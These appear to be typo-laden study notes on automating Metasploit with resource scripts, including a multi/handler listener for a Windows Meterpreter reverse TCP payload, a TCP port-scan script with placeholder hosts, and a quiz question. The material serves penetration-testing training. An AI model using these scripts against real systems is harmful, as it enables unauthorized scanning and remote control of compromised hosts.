# Automating Metasploit with Resourse Script

resouse scrript more close to bash script
run the script all the cmd will run sequenctially

## DEMO
collection of resource script 
> ls -al /usr/share/metasploit-framework/scripts/resource

extection - ** .rc **

> vim handler.rc
### inside script 
```bash
use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost <ip>
set lport <port>
run
```
### how to run scrupt
> msfconsole -r handler.rc


portscan eg:
	use auxiliary/scanner/portscan/tcp
	set RHOSTS <ip>
	run	
> msfconsole -r portscan.rc

Which one of the following Msfconsole commands can be used to load a resource script?:
	> resource ~/Desktop/handler.rc

